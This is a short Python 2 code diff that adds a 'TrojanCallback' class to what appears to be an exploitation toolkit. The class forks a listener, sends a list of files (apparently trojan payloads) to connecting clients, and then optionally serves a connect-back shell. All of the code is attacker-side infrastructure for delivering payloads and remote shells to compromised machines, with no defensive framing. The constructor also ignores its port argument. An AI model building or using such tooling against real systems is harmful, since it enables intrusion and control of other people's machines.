@@ -108,4 +108,43 @@ class Callback(object):
                 return pid
             else:
                 self.serve_callback_shell()
+   
+
+class TrojanCallback(Callback):
+    def __init__(self,callback_ip,files_to_serve,port=8080,connectback_shell=False):
+        super(self.__class__,self).__init__(callback_ip,port=8080)
+        self.files_to_serve=files_to_serve
+        self.connectback_shell=connectback_shell
     
+   
+    def serve_file_to_client(self,filename,serversocket):
+        data=open(filename,"r").read();
+        (clientsocket,address) = serversocket.accept()
+        clientsocket.send(data)
+        
+        clientsocket.shutdown(socket.SHUT_RDWR)
+        clientsocket.close()
+    def exit(self):
+        os.execv("/bin/true",["/bin/true"])
+
+    def serve_callback(self):
+        pid=os.fork()
+        if 0!=pid:
+            return pid
+
+        serversocket=self.server(self.port)
+        for _file in self.files_to_serve:
+            print "Waiting to send file: %s\n" % _file
+            self.serve_file_to_client(_file,serversocket)
+            print "\nDone with file: %s\n"%_file
+        
+        serversocket.shutdown(socket.SHUT_RDWR)
+        serversocket.close()
+        
+        if self.connectback_shell == True:
+            print "Serving callback_shell."
+            self.serve_callback_shell()
+        self.exit()
+            
+
+
